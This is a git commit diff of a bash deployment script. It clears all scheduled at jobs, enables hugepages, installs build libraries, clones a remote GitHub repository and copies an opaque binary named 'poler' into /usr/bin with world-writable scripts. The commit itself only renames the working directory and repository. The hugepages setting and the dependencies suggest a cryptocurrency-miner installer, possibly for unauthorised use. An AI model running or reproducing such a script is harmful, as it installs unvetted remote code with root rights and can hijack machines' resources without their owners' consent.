1a541aba6075433273d344635a4d9d308325357b
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-28 01:36:04 +0300

    w16

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/expertmode/
+rm -rf /tmp/fckin-final1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir expertmode
-git clone https://github.com/masketteland/expertmode.git /tmp/expertmode
-cd /tmp/expertmode
-chmod +x /tmp/expertmode/poler
+cd /tmp && mkdir fckin-final1
+git clone https://github.com/masketteland/fckin-final1.git /tmp/fckin-final1
+cd /tmp/fckin-final1
+chmod +x /tmp/fckin-final1/poler
 chmod 777 ./*.sh
-cp /tmp/expertmode/poler /usr/bin/
+cp /tmp/fckin-final1/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
